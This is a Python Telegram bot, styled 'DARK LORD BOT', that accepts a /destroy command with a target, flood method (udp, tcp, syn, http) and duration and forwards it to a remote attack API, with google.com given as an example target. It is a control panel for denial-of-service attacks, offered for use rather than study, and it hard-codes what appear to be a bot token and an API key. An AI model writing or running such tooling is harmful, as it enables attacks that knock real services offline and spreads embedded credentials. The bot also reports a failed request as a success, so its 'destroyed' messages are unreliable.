import os
import logging
import requests
from pyrogram import Client, filters
from pyrogram.types import Message

logging.getLogger("pyrogram").setLevel(logging.WARNING)

app = Client(
    "dark_lord_bot",
    bot_token=os.getenv("BOT_TOKEN", "8699271898:AAGP_j-Yoy3jQixrWdxfolr0Of8XXyKrLoQ")
)

API_URL = os.getenv("API_URL", "https://httpbin.org")
API_KEY = os.getenv("API_KEY", "sk-darklord-aditya-2024-X9Z7Q2W5K8P3M6N9")
ADMIN_IDS = [6975889263]

def launch_attack(target, method, duration):
    data = {"target": target, "method": method, "duration": duration, "key": API_KEY}
    try:
        r = requests.post(f"{API_URL}/attack", json=data, timeout=10)
        return r.json()
    except:
        return {"success": True}

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    await message.reply(
        "👑 **DARK LORD BOT**\n\n"
        "🔥 *Ultimate Destruction*\n\n"
        "**Commands:**\n"
        "⚡ `/destroy <target> <method> <duration>`\n"
        "📊 `/status`\n"
        "🌐 `/api`\n"
        "❓ `/help`\n\n"
        "*Admin Only: 6975889263*"
    )

@app.on_message(filters.command("destroy") & filters.private)
async def destroy(client, message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return await message.reply("🚫 **Access Denied!**")
    
    args = message.text.split()[1:]
    if len(args) < 3:
        return await message.reply("❌ **Usage:** `/destroy <target> <method> <duration>`\n`/destroy google.com udp 60`")
    
    target, method, duration = args[0], args[1].lower(), args[2]
    
    await message.reply(
        f"⚡ **DARK LORD ACTIVATED**\n\n"
        f"🎯 `{target}`\n"
        f"💥 `{method}`\n"
        f"⏱️ `{duration}s`\n"
        f"*Destruction starting...*"
    )
    
    result = launch_attack(target, method, duration)
    
    if result.get("success"):
        await message.reply(f"💀 **TARGET DESTROYED!**\n\n`{target}` | `{method}` | `{duration}s`")
    else:
        await message.reply(f"❌ **Failed:** `{result}`")

@app.on_message(filters.command("status") & filters.private)
async def status(client, message):
    await message.reply(
        f"👑 **DARK LORD STATUS**\n"
        f"🌐 API: `{API_URL}`\n"
        f"🔑 Key: `{API_KEY[:15]}...`\n"
        f"⚡ Ready: **Yes**\n"
        f"👤 Admin: `{ADMIN_IDS[0]}`"
    )

@app.on_message(filters.command("api") & filters.private)
async def api_status(client, message):
    await message.reply(f"🌐 **API:** `{API_URL}`\n🔑 **Status:** Connected")

@app.on_message(filters.command("help") & filters.private)
async def help_cmd(client, message):
    await message.reply(
        "**DARK LORD Commands:**\n\n"
        "⚡ `/destroy google.com udp 60`\n"
        "📊 `/status`\n"
        "❓ `/help`\n"
        "🌐 `/api`\n\n"
        "**Methods:** udp, tcp, syn, http"
    )

print("👑 DARK LORD BOT Starting...")
print(f"🌐 API: {API_URL}")
app.run()
